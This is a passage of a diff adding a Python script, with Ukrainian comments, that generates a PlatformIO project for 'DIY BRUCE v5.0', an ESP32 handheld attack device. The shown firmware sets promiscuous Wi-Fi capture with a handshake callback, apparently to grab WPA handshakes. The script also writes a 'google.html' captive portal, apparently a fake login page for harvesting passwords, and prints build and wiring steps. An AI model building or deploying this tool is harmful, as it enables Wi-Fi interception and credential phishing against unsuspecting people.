+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
+    state=S_MENU;drawMain();
+    showMsg("DIY BRUCE v5.0 ready",1500);
+}
+void loop(){
+    if(webRunning)server.handleClient();
+    switch(state){
+        case S_MENU:
+            if(btn(BTN_LEFT)){mi=(mi-1+6)%6;drawMain();}
+            else if(btn(BTN_RIGHT)){mi=(mi+1)%6;drawMain();}
+            else if(btn(BTN_OK)||btn(BTN_DOWN)){state=S_SUB;si=0;drawSub();}
+            break;
+        case S_SUB:
+            int sz;
+            switch(mi){case 0:sz=S[0];break;case 1:sz=S[1];break;case 2:sz=S[2];break;case 3:sz=S[3];break;case 4:sz=S[4];break;default:sz=S[5];break;}
+            if(btn(BTN_UP)){si=(si-1+sz)%sz;drawSub();}
+            else if(btn(BTN_DOWN)){si=(si+1)%sz;drawSub();}
+            else if(btn(BTN_OK)){exec();state=S_MENU;drawMain();}
+            else if(btn(BTN_BACK)){state=S_MENU;drawMain();}
+            break;
+    }
+    delay(20);
+}
+'''
+
+# ----------------------------------------------------------------------------
+# СТВОРЕННЯ ПРОЕКТУ
+# ----------------------------------------------------------------------------
+def create_project():
+    base = PROJECT_NAME
+    if os.path.exists(base):
+        shutil.rmtree(base)
+    
+    os.makedirs(os.path.join(base, "src"))
+    os.makedirs(os.path.join(base, "include"))
+    os.makedirs(os.path.join(base, "data"))
+    os.makedirs(os.path.join(base, "data", "portal"))
+    
+    with open(os.path.join(base, "platformio.ini"), "w") as f:
+        f.write(PLATFORMIO_INI)
+    with open(os.path.join(base, "custom_4Mb.csv"), "w") as f:
+        f.write(CUSTOM_PARTITIONS)
+    with open(os.path.join(base, "include", "icons.h"), "w") as f:
+        f.write(ICONS_H)
+    with open(os.path.join(base, "data", "index.html"), "w") as f:
+        f.write(INDEX_HTML)
+    with open(os.path.join(base, "data", "portal", "google.html"), "w") as f:
+        f.write(GOOGLE_PORTAL)
+    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
+        f.write(MAIN_CPP)
+    
+    print("=" * 70)
+    print("✅ ПРОЕКТ СТВОРЕНО: " + os.path.abspath(base))
+    print("=" * 70)
+    print("📌 ЩО ТЕПЕР ЗРОБИТИ:")
+    print("1. Відкрий VS Code у папці: " + os.path.abspath(base))
+    print("2. Натисни Ctrl+Shift+P -> PlatformIO: Build")
+    print("3. Підключи ESP32 через USB")
+    print("4. Натисни PlatformIO: Upload")
+    print("")
+    print("🔌 ПІДКЛЮЧЕННЯ ДО ESP32:")
+    print("   OLED SDA -> GPIO21")
+    print("   OLED SCL -> GPIO22")
+    print("   OLED VCC -> 3.3V")
+    print("   OLED GND -> GND")
+    print("   Кнопки UP/DOWN/OK/LEFT/RIGHT/BACK -> GPIO 15,13,12,14,27,26")
+    print("")
+    print("⚠️ ЯКЩО ПОМИЛКА КОМПІЛЯЦІЇ:")
+    print("   Видали папку .pio та перезапусти PlatformIO")
+    print("=" * 70)
+
+if __name__ == "__main__":
+    create_project()
